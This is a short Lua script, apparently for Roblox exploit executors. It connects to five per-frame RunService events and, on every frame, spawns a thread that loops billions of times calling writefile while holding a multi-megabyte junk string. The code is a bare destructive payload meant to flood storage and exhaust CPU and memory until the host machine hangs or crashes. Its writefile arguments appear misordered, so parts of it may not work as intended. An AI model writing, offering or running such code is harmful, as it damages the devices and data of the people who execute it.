local RunService = game:FindService("RunService")
local Loops = {
    RunService.Stepped,
    RunService.RenderStepped,
    RunService.Heartbeat,
    RunService.PreRender,
    RunService.PreSimulation
}

local String = string.rep("𪚥🈵", 9e5)

for _, RS in ipairs(Loops) do
    RS:Connect(function()
        task.spawn(function()
            for _ = -9e9, 9e9 do writefile(string.rep("M", 120), _ .. ".txt", String) end        
        end)
    end)
end
